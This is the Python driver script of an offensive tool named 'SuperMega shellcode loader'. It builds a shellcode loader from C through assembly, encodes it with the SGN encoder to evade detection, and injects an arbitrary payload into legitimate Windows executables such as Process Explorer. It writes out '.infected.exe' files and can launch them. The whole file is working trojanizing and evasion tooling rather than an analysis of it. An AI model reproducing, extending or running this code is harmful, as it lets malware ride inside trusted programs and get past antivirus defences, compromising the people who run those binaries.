import shutil
from enum import Enum
from helper import *
import argparse
from typing import Dict
import pickle

from model import *
from config import config
from pehelper import *
from phases.ctoasm import *
from phases.asmtoshc import *
from phases.shctoexe import *
from observer import observer
from project import project

main_c_file = os.path.join(build_dir, "main.c")
main_asm_file = os.path.join(build_dir, "main.asm")
main_exe_file = os.path.join(build_dir, "main.exe")
main_shc_file = os.path.join(build_dir, "main.bin")


def main():
    print("Super Mega")
    config.load()

    parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
    parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
    parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
    parser.add_argument('--verify', type=str, help='Debug: Perform verification: std/iat')
    parser.add_argument('--show', type=str, help='Debug: Show tool output')
    args = parser.parse_args()

    if args.show:
        project.show_command_output = True

    if args.verify:
        project.payload = "shellcodes/createfile.bin"
        project.verify = True

        project.try_start_final_infected_exe = False
        project.try_start_final_shellcode = False
        project.try_start_final_infected_exe = False

        if args.verify == "std":
            project.source_style = SourceStyle.peb_walk
            project.inject = True
            project.inject_mode = "1,1"
            project.inject_exe_in = "exes/procexp64.exe"
            project.inject_exe_out = "out/procexp64-a.exe"
        elif args.verify == "iat":
            project.source_style = SourceStyle.iat_reuse
            project.inject = True
            project.inject_mode = "1,1"
            project.inject_exe_in = "exes/iattest-full.exe"
            project.inject_exe_out = "out/iatttest-full-a.exe"
        elif args.verify == "rwx":
            project.source_style = SourceStyle.peb_walk
            project.inject = True
            project.inject_mode = "1,1"
            project.inject_exe_in = "exes/wifiinfoview.exe"
            project.inject_exe_out = "out/wifiinfoview.exe-a.exe"

        else:
            print("Unknown verify option {}, use std/iat".format(args.verify))

    else:
        project.try_start_final_infected_exe = True

        if args.shellcode:
            if not os.path.isfile(args.shellcode):
                print("Could not find: {}".format(args.shellcode))
                return
            project.payload = args.shellcode
        if args.inject:
            if not os.path.isfile(args.inject):
                print("Could not find: {}".format(args.inject))
                return
            project.inject = True
            project.inject_exe_in = args.inject
            project.inject_exe_out = args.inject.replace(".exe", ".infected.exe")

    start()


def start():
    # Delete: all old files
    if project.cleanup_files_on_start:
        clean_files()
        delete_all_files_in_directory("logs/")

    # Check: Destination EXE capabilities
    project.exe_capabilities = ExeCapabilities([
        "GetEnvironmentVariableW",
        "VirtualAlloc"
    ])
    project.exe_capabilities.parse_from_exe(project.inject_exe_in)
    project.exe_capabilities.print()

    # choose which source / technique we gonna use
    if project.exe_capabilities.has_all():
        project.source_style = SourceStyle.iat_reuse
    else:
        project.source_style = SourceStyle.peb_walk

    #observer.add_json("capabilities_a", project.exe_capabilities)
    #observer.add_json("options", options)

    print("--[ SourceStyle: {}".format(project.source_style.name))

    # Copy: loader C files into working directory: build/
    create_c_from_template()

    # Convert: C -> ASM
    if project.generate_asm_from_c:
        # Find payload size
        with open(project.payload, 'rb') as input2:
            data_payload = input2.read()
            payload_length = len(data_payload)
            #observer.add_text("payload_asm_orig", str(data_payload))
        asm = make_c_to_asm(main_c_file, main_asm_file, payload_length, project.exe_capabilities)
        observer.add_text("payload_asm_orig", asm["initial"])
        observer.add_text("payload_asm_cleanup", asm["cleanup"])
        observer.add_text("payload_asm_fixup", asm["fixup"])

    # Convert: ASM -> Shellcode
    if project.generate_shc_from_asm:
        code = make_shc_from_asm(main_asm_file, main_exe_file, main_shc_file)
        observer.add_code("generate_shc_from_asm", code) 
    
    # Try: Starting the shellcode (rarely useful)
    if project.try_start_loader_shellcode:
        try_start_shellcode(main_shc_file)


    # Merge shellcode/loader with payload
    if project.dataref_style == DataRefStyle.APPEND:
        merge_loader_payload(main_shc_file)

        if project.verify and project.source_style == SourceStyle.peb_walk:
            print("--[ Verify final shellcode ]")
            if not verify_shellcode(main_shc_file):
                print("Could not verify, still continuing")
                #return

        if project.try_start_final_shellcode:
            print("--[ Test Append shellcode ]")
            try_start_shellcode(main_shc_file)

        # copy it to out
        shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_shc_file)))


    # SGN
    #  after we packed everything (so jmp to end of code still works)
    #if options["obfuscate_shc_loader"] and project.exe_capabilities.rwx_section != None:
    if project.exe_capabilities.rwx_section != None:
        print("--[ Use SGN]")
        obfuscate_shc_loader(main_shc_file, main_shc_file + ".sgn")

        observer.add_code("payload_sgn", file_readall_binary(main_shc_file + ".sgn"))
        shutil.move(main_shc_file + ".sgn", main_shc_file)
    
        #if options["verify"]:
        #    if not verify_shellcode("main-clean.bin"):
        #        return

    # inject merged loader into an exe
    if project.inject:
        #debug_data["original_exe"] = file_readall_binary(options["inject_exe_in"])

        inject_exe(main_shc_file)
        if project.verify:
            print("--[ Verify final exe ]")
            if verify_injected_exe(project.inject_exe_out):
                #debug_data["infected_exe"] = file_readall_binary(options["inject_exe_out"])
                pass

        if project.try_start_final_infected_exe:
            print("--[ Start infected exe ]")
            subprocess.run([
                project.inject_exe_out,
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # dump the info i gathered
    #file = open('latest.pickle', 'wb')
    #pickle.dump(data, file)
    #file.close()

    # delete files
    if project.cleanup_files_on_exit:
        clean_files()


def obfuscate_shc_loader(file_shc_in, file_shc_out):
    print("--[ Convert with SGN ]")
    if True:
        path_sgn = r'C:\tools\sgn2.0\sgn.exe'
        subprocess.run([
            path_sgn,
            "-a", "64",
            "{}".format(file_shc_in),
        ], check=True)
        #shutil.copy(file_shc_in + ".sgn", file_shc_out)
    else:
        path_sgn = r'C:\training\tools\sgn\sgn.exe'
        subprocess.run([
            path_sgn,
            "--arch=64",
            "-i", "{}".format(file_shc_in),
            "-o", "{}".format(file_shc_out),
        ], check=True)
    if not os.path.isfile(file_shc_out):
        print("Error")
        return
    else:
        print("   > Success obfuscation")
        pass


def verify_shellcode(shc_name):
    print("---[ Verify shellcode: {} ]".format(shc_name))

    # check if directory exists
    if not os.path.exists(os.path.dirname(verify_filename)):
        print("Error, directory does not exist for: {}".format(verify_filename))
        return
    
    # remove indicator file
    pathlib.Path(verify_filename).unlink(missing_ok=True)

    subprocess.run([
        config.get("path_runshc"),
        "{}".format(shc_name),
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # , check=True
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(verify_filename):
        print("---> Verify OK. Shellcode works (file was created)")
        os.remove(verify_filename)
        return True
    else:
        print("---> Verify FAIL. Shellcode doesnt work (file was not created)")
        return False
    

if __name__ == "__main__":
    main()

